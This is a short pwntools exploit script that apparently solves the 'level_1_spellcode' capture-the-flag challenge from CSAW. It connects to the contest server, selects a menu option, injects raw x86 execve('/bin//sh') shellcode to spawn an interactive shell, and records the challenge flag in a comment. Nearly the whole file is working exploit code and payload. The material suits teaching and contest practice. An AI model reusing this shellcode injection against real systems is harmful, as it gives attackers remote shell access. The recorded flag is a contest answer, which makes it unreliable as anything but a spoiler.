#!/usr/bin/env python3

from pwn import *

exe = ELF("level_1_spellcode")

context.binary = exe


def conn():
	if False:
		return process([exe.path])
	else:
		return remote("pwn.red.csaw.io", 5000)


def main():
	r = conn()
	r.recvuntil(">")
	r.sendline("6")
	r.recvuntil("> ")
	r.sendline("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")
	r.interactive()


if __name__ == "__main__":
	main()

# Shellcode found at: http://shell-storm.org/shellcode/files/shellcode-517.php
# Flag: flag{w3lc0m3_t0_sh3llc0d1ng!!!}
# 1 hr in comp
